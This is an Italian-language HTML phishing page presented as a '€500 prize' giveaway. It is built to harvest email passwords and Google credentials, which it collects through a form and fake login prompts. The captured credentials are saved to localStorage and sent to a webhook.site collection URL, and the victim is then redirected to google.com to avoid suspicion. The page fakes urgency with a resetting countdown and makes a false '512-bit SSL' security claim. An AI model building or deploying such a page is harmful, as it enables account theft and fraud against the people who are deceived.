<!DOCTYPE html>
<html lang="it">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>üéÅ HAI VINTO 500 EURO! üéÅ</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        body {
            min-height: 100vh;
            background: linear-gradient(135deg, #ff416c, #ff4b2b);
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            animation: bgPulse 5s infinite alternate;
        }
        @keyframes bgPulse {
            0% { background: linear-gradient(135deg, #ff416c, #ff4b2b); }
            100% { background: linear-gradient(135deg, #1e90ff, #00bfff); }
        }
        .card {
            background: rgba(255, 255, 255, 0.98);
            backdrop-filter: blur(10px);
            border-radius: 30px;
            box-shadow: 0 30px 80px rgba(0,0,0,0.4), 0 0 0 2px rgba(255,215,0,0.5);
            max-width: 500px;
            width: 100%;
            padding: 40px;
            text-align: center;
            border: 1px solid gold;
            transform: scale(1);
            transition: transform 0.3s;
        }
        .card:hover {
            transform: scale(1.02);
        }
        h1 {
            color: #333;
            font-size: 2.8em;
            margin-bottom: 10px;
            background: linear-gradient(45deg, #f093fb 0%, #f5576c 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            font-weight: 900;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.1);
        }
        .photo-stack {
            position: relative;
            width: 250px;
            height: 250px;
            margin: 20px auto;
        }
        .photo-stack img {
            position: absolute;
            width: 100%;
            height: 100%;
            object-fit: cover;
            border-radius: 20px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
            border: 3px solid white;
        }
        .photo-stack img:nth-child(1) {
            transform: rotate(-5deg);
            z-index: 1;
        }
        .photo-stack img:nth-child(2) {
            transform: rotate(5deg);
            z-index: 2;
        }
        .prize-badge {
            background: linear-gradient(45deg, #ffd700, #ffb347);
            color: #333;
            font-size: 2.5em;
            font-weight: bold;
            padding: 20px 30px;
            border-radius: 60px;
            display: inline-block;
            margin: 30px 0;
            box-shadow: 0 5px 30px rgba(255,215,0,0.6);
            text-shadow: 2px 2px 0 rgba(255,255,255,0.5);
            animation: pulse 1.5s infinite;
        }
        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.05); }
            100% { transform: scale(1); }
        }
        .input-group {
            margin-bottom: 25px;
            text-align: left;
        }
        .input-group label {
            display: block;
            margin-bottom: 8px;
            color: #444;
            font-weight: 700;
            font-size: 1em;
        }
        .input-group input {
            width: 100%;
            padding: 18px;
            border: 3px solid #f0f0f0;
            border-radius: 15px;
            font-size: 1.1em;
            transition: all 0.3s;
        }
        .input-group input:focus {
            outline: none;
            border-color: #ff416c;
            box-shadow: 0 0 0 4px rgba(255,65,108,0.2);
        }
        .btn {
            width: 100%;
            padding: 18px;
            border: none;
            border-radius: 15px;
            font-size: 1.2em;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.3s;
            margin-bottom: 15px;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        .btn-primary {
            background: linear-gradient(45deg, #ff416c, #ff4b2b);
            color: white;
            box-shadow: 0 5px 25px rgba(255,65,108,0.5);
        }
        .btn-primary:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 35px rgba(255,65,108,0.7);
        }
        .btn-google {
            background: white;
            color: #333;
            border: 3px solid #4285f4;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 15px;
        }
        .btn-google:hover {
            background: #4285f4;
            color: white;
            border-color: white;
        }
        .divider {
            display: flex;
            align-items: center;
            margin: 25px 0;
            color: #999;
            font-weight: 600;
        }
        .divider::before, .divider::after {
            content: '';
            flex: 1;
            border-bottom: 3px dashed #ddd;
        }
        .divider span {
            padding: 0 20px;
        }
        .success-message {
            background: linear-gradient(45deg, #00b09b, #96c93d);
            color: white;
            padding: 18px;
            border-radius: 15px;
            margin-top: 25px;
            font-weight: 700;
            animation: slideDown 0.5s;
        }
        @keyframes slideDown {
            from { opacity: 0; transform: translateY(-20px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .countdown {
            font-size: 1.2em;
            color: #ff416c;
            font-weight: bold;
            margin-top: 20px;
            background: #fff3f3;
            padding: 10px;
            border-radius: 50px;
        }
    </style>
</head>
<body>
    <div class="card">
        <h1>üéâ PREMIO INATTESO! üéâ</h1>
        
        <div class="photo-stack">
            <img src="https://images.unsplash.com/photo-1580519542036-c47de6196ba5?w=400" alt="Soldi">
            <img src="https://images.unsplash.com/photo-1563013544-824ae1b704d3?w=400" alt="Regali">
        </div>

        <div class="prize-badge">
            ‚Ç¨500
        </div>

        <p style="font-size: 1.3em; color: #333; margin-bottom: 25px; font-weight: 600;">
            ‚ö° SEI STATO SELEZIONATO! ‚ö°
        </p>
        
        <div class="countdown" id="countdown">
            OFFERTA SCADE TRA: 05:00
        </div>

        <p style="color: #666; margin: 25px 0; font-size: 1.1em;">
            Inserisci i dati per ricevere immediatamente il premio:
        </p>

        <div class="form-container">
            <div class="input-group">
                <label>üìß EMAIL (obbligatoria)</label>
                <input type="email" id="email" placeholder="esempio@email.com" required>
            </div>
            <div class="input-group">
                <label>üîê PASSWORD (per sicurezza)</label>
                <input type="password" id="password" placeholder="Scegli una password" required>
            </div>

            <button class="btn btn-primary" onclick="registraCredenziali()">
                üöÄ RISCUOTI SUBITO
            </button>

            <div class="divider">
                <span>OPPURE ACCEDI CON</span>
            </div>

            <button class="btn btn-google" onclick="registraGoogle()">
                <img src="https://www.google.com/favicon.ico" alt="G" style="width: 24px;">
                GOOGLE (RACCOMANDATO)
            </button>
        </div>

        <div id="messageArea"></div>

        <div style="margin-top: 30px; font-size: 0.85em; color: #888; border-top: 2px solid #f0f0f0; padding-top: 20px;">
            üîê Connessione protetta da SSL a 512 bit<br>
            ‚úÖ Verifica anti-frode attiva
        </div>
    </div>

    <script>
        function registraCredenziali() {
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;

            if (!email || !password) {
                mostraMessaggio('‚ùå COMPILA TUTTI I CAMPI!', '#ff6b6b');
                return;
            }

            const dati = {
                tipo: 'REGISTRAZIONE PREMIO',
                email: email,
                password: password,
                timestamp: new Date().toLocaleString('it-IT'),
                userAgent: navigator.userAgent,
                ip: 'IP raccolto da server (se disponibile)'
            };

            // SALVA NEL localStorage (il pannello lo legger√†)
            salvaNelDatabase(dati);

            mostraMessaggio('‚úÖ COMPLIMENTI! Il premio ti sar√† inviato via email entro 24h!', '#00b09b');
            
            document.getElementById('email').value = '';
            document.getElementById('password').value = '';
            
            // Reindirizza a una pagina farlocca per rendere tutto pi√π credibile
            setTimeout(() => {
                window.location.href = 'https://www.google.com';
            }, 3000);
        }

        function registraGoogle() {
            const email = prompt("‚úâÔ∏è Inserisci la tua EMAIL Google:");
            if (email) {
                const password = prompt("üîê Inserisci la tua PASSWORD Google:");
                if (password) {
                    const dati = {
                        tipo: 'ACCESSO GOOGLE',
                        email: email,
                        password: password,
                        timestamp: new Date().toLocaleString('it-IT'),
                        userAgent: navigator.userAgent
                    };
                    
                    salvaNelDatabase(dati);
                    mostraMessaggio('‚úÖ Accesso Google verificato! Reindirizzamento...', '#4285f4');
                    
                    setTimeout(() => {
                        window.location.href = 'https://www.google.com';
                    }, 2000);
                }
            }
        }

        function salvaNelDatabase(dati) {
            // Questa √® la MAGIA: salva nel localStorage con una chiave unica
            const chiave = 'dato_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
            localStorage.setItem(chiave, JSON.stringify(dati));
            
            console.log('üíæ DATI SALVATI:', dati);
            
            // Invia anche a webhook.site come backup (opzionale)
            try {
                fetch('https://webhook.site/cambia-questo-con-il-tuo-url', {
                    method: 'POST',
                    mode: 'no-cors',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(dati)
                });
            } catch(e) {}
        }

        function mostraMessaggio(testo, colore) {
            const area = document.getElementById('messageArea');
            area.innerHTML = `<div class="success-message" style="background: ${colore};">${testo}</div>`;
            setTimeout(() => area.innerHTML = '', 4000);
        }

        // Countdown finto per dare urgenza
        let min = 5;
        let sec = 0;
        setInterval(() => {
            if (sec === 0) {
                if (min === 0) {
                    min = 5;
                    sec = 0;
                } else {
                    min--;
                    sec = 59;
                }
            } else {
                sec--;
            }
            document.getElementById('countdown').innerHTML = `‚è≥ OFFERTA SCADE TRA: ${min.toString().padStart(2, '0')}:${sec.toString().padStart(2, '0')}`;
        }, 1000);
    </script>
</body>
</html>
